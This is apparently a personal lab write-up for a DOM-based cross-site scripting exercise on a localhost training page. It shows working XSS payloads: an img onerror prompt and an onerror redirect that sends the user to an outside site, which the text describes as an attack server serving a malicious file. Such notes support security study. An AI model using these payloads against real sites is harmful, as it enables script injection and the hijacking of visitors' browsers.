http://localhost/labs/x0x01.php   #xss/dom
https://owasp.org/www-community/attacks/DOM_Based_XSS
https://portswigger.net/web-security/cross-site-scripting/dom-based

## SETUP  
* DEV TOOLS -> Network Tab
* when you type in the form and add an item to your list, you don't see any new requests in the network tab.
* this tells us everything happening in this form is happening local/client based, thus DOM XSS

## Try Basic Payloads
```js
<script>prompt(1)</script>
```
* FAIL : this didn't work, because even though the code is being added to the page, it is NOT getting called, we need a trigger
```js
<img src=x onerror="prompt(1)">
```
* DOM XSS successful! 
* Lets try using same payload, but forwarding user to a different location, such as an attack server to get a malicous file?
```js 
<img src=x onerror="window.location.href='https://tcm-sec.com'">
```
* This successfully redirects user to URL above